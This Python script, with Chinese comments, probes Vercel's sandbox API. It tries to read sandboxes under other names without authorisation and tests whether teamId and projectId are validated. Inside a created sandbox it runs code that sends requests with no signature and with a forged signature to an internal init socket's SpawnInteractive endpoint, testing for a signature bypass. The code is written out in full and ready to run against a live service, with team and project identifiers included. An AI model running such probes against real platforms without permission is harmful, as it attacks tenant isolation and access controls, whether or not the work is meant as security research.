# 实验J99: SpawnInteractive 签名验证 + API 沙箱名越权探测
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

# --- 本地 API 层探测 ---
print("== [A] GET /v2/sandboxes/{name} 陌生名字 (越权读?) ==", flush=True)
for name in ["test", "test1", "abc", "sandbox", "default", "my-sandbox"]:
    c, r = api("GET", f"/v2/sandboxes/{name}?teamId={TEAM}")
    print(f"  [{name}] {c}: {r[:200]}", flush=True)
    time.sleep(0.3)

print("== [B] GET 自己的沙箱详情 (对照) ==", flush=True)
c, r = api("GET", f"/v2/sandboxes/expj99?teamId={TEAM}")
print(f"  expj99(不存在) {c}: {r[:200]}", flush=True)

print("== [C] projectId 校验: 不存在 project ==", flush=True)
c, r = api("GET", f"/v2/sandboxes?teamId={TEAM}&projectId=prj_doesnotexist123")
print(f"  {c}: {r[:300]}", flush=True)

print("== [D] 无 teamId 参数 ==", flush=True)
c, r = api("GET", f"/v2/sandboxes")
print(f"  {c}: {r[:200]}", flush=True)

# --- 沙箱内 SpawnInteractive 签名测试 ---
NAME = "expj99"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("\ncreate:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import socket, base64, time

SIG = base64.b64encode(b"\x99" * 64).decode()
TS = str(int(time.time() * 1000))

def probe_interactive(use_sig, body=b"\x00\x00\x00\x00\x02"):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect("/run/vercel/share/init.sock")
        headers = ["POST /vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive HTTP/1.1",
                   "Host: localhost", "Content-Type: application/connect+json",
                   "Connect-Protocol-Version: 1", "x-timestamp: " + TS,
                   "Content-Length: " + str(len(body))]
        if use_sig:
            headers.append("x-signature: " + SIG)
        s.sendall(("\r\n".join(headers) + "\r\n\r\n").encode() + body)
        data = b""
        try:
            while len(data) < 1500:
                chunk = s.recv(1500 - len(data))
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        s.close()
        if not data:
            return "NO-RESP"
        return data[:500].decode(errors="replace")
    except Exception as e:
        return f"ERR({e})"

print("== SpawnInteractive 无签名 ==", flush=True)
print(repr(probe_interactive(False)), flush=True)
print("== SpawnInteractive 假签名 ==", flush=True)
print(repr(probe_interactive(True)), flush=True)
print("== Ping 对照 (无签名, 应免签) ==", flush=True)
try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(6)
    s.connect("/run/vercel/share/init.sock")
    s.sendall((f"POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/connect+json\r\nConnect-Protocol-Version: 1\r\nx-timestamp: {TS}\r\nContent-Length: 2\r\n\r\n").encode() + b"{}")
    data = b""
    try:
        while len(data) < 800:
            chunk = s.recv(800 - len(data))
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    print(repr(data[:400]), flush=True)
except Exception as e:
    print("ERR", e, flush=True)
"""
run_cmd(sid, PROBE, "interactive-sig", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
